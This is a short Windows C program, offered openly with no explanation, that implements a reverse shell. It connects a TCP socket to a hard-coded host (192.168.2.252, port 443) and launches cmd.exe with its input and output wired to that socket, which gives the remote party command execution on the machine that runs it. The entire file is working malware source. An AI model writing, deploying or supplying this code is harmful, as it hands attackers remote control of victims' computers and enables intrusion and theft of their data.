#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")
  WSADATA ata;//WsData
  SOCKET sock;//WinSock
  SOCKET Sock;
  struct sockaddr_in boom;//in hax
  char ip[32]; //ip_addr
  STARTUPINFO proc; //ini_processo
  PROCESS_INFORMATION info; //processo_info
  int launch();

int main(int argc, char *argv[])
{
launch();
}

int launch()
{

    WSAStartup(MAKEWORD(2,2), &ata);
    sock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    //struct hostent *host;
    //host = gethostbyname("192.168.1.66");
    //strncpy(ip, "192.168.1.66");//inet_ntoa(*((struct in_addr *)host->h_addr)));
    boom.sin_family = AF_INET;
    boom.sin_port = htons(atoi("443"));
    boom.sin_addr.s_addr = inet_addr("192.168.2.252");
    WSAConnect(sock,(SOCKADDR*)&boom,sizeof(boom),NULL,NULL,NULL,NULL);
    memset(&proc,0,sizeof(proc));
    proc.cb=sizeof(proc);
    proc.dwFlags=STARTF_USESTDHANDLES;
    proc.hStdInput = proc.hStdOutput = proc.hStdError = (HANDLE)sock;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&proc,&info);


}
